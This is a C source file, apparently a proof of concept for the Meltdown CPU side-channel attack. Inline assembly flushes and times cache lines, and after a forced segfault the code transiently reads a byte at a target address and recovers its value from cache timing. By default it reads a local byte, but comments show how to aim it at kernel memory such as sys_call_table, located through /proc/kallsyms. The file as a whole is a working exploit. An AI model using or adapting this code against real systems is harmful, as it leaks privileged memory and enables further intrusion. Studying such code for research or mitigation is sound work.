#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#include <signal.h>
#include <setjmp.h>


#define PAGE_SIZE_SHIFT      (0xC)
#define PAGE_SIZE_SHIFT_STR  "0xC"
#define PAGE_SIZE            (1 << PAGE_SIZE_SHIFT)
#define MAX_CACHE_READ_TICKS (200)

__attribute__((always_inline))
inline unsigned long get_access_ticks(const char *addr)
{
    volatile unsigned long time;

    asm __volatile__ (
        "mfence             \n"
        "lfence             \n"
        "rdtsc              \n"
        "lfence             \n"
        "movl %%eax, %%esi  \n"
        "movl (%1), %%eax   \n"
        "lfence             \n"
        "rdtsc              \n"
        "subl %%esi, %%eax  \n"
        "clflush 0(%1)      \n"
        : "=a" (time)
        : "c" (addr)
        :  "%esi", "%edx");

    return time;
}

__attribute__((always_inline))
inline void heat_cache(uintptr_t addr, char* buf)
{
    asm __volatile__ (
        "%=:                                  \n"
        "xorq %%rax, %%rax                    \n"
        "movb (%[addr]), %%al                  \n"
        "shlq $" PAGE_SIZE_SHIFT_STR ", %%rax \n"
        "jz %=b                               \n"
        "movq (%[buf], %%rax, 1), %%rbx       \n"
        : 
        :  [addr] "r" (addr), [buf] "r" (buf)
        : "%rax", "%rbx");
}

__attribute__((always_inline))
inline void clflush(const char *address)
{
    asm __volatile__ (
        "mfence         \n"
        "clflush 0(%0)  \n"
        :
        : "r" (address)
        :            );
}

static jmp_buf jbuf;

static void sigsegv_handler(int signo)
{
    siglongjmp(jbuf, 1);
}

void main()
{
    uintptr_t address_to_guess_byte = 0;
        // = 0xffffffff986001e0; // uncomment to test with global addresses.
        // I do tests on sys_call_table. Your current sys_call_table address can be found: sudo cat /proc/kallsyms | grep sys_call_table
        // sys_read address should be first value in sys_call_table.
        // You can find your sys_read address: sudo cat /proc/kallsyms | grep sys_read

    if (address_to_guess_byte == 0) { // testing with local address
        char *local_byte = malloc(1);
        *local_byte = 0xAA;
        address_to_guess_byte = (uintptr_t) local_byte;
    }

    char *meltdown_buf = malloc(PAGE_SIZE * 256);
    memset(meltdown_buf, 0, PAGE_SIZE * 256); // improves cache side effects detection

    signal(SIGSEGV, sigsegv_handler);

    for (int i = 0; i < 100; i++) {
        for (int i = 0; i < 256; i++) {
            clflush(&meltdown_buf[i * PAGE_SIZE]); // improves cache side effects detection
        }

        if (sigsetjmp(jbuf, !0) == 0) {
            int *ptr = NULL;
            *ptr = 1; // force SIGSEGV by setting value by NULL pointer (even when testing with local addrress)

            // The code below should not be executed because of SEISEGV.
            // But don't worry. It most likely will be executed because of out-of-order execution optimizations in Intel CPUs :-)

            heat_cache(address_to_guess_byte, meltdown_buf);

            printf("you should never see this line because of SIGSEGV above\n");
        } else { // else branch is executed on SIGSEGV
            static unsigned long ticks[256];

            // measure access ticks of each page in the buffer
            for (int i = 0; i < 256; i++) {
                ticks[i] = get_access_ticks(&meltdown_buf[PAGE_SIZE * i]);
            }

            for (int i = 0; i < 256; i++) {
                if (ticks[i] < MAX_CACHE_READ_TICKS) { // reading cached page takes less CPU ticks then reading not cached one
                    // if the page is in the cache then the corresponding page shift is most likely the byte value we are guessing
                    printf("guessed byte: 0x%X\n", i);
                }
            }
        }
    }
}
